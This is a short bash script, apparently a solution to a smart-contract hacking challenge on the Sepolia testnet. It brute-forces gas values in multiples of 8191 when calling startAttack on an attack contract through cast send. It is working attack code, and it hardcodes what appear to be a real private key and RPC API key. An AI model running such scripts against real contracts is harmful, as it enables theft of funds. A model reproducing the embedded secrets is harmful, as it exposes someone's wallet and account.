#!/bin/bash

# Replace these with your actual values
RPC_URL=https://eth-sepolia.g.alchemy.com/v2/DNz5JycrplzmeCRAgyA9-pAtH2Q0s45c
PRIVATE_KEY=0xc148f6b35324483e97c7925de006f116074c695c5a39344f6e1e61f79e350c02
ATTACK_CONTRACT=0x5f66da0F6672D9DAd9C7B09F6CDb36f28380cfdA

for ((GAS=8191*3; GAS<=8191*4; GAS++)); do
  echo "Trying with gas: $GAS"

  cast send $ATTACK_CONTRACT "startAttack(uint256)" $GAS \
    --rpc-url $RPC_URL \
    --private-key $PRIVATE_KEY \
    --legacy  2>/dev/null


  if [ $? -eq 0 ]; then
    echo "✅ Success with gas: $GAS"
    break
  fi
done
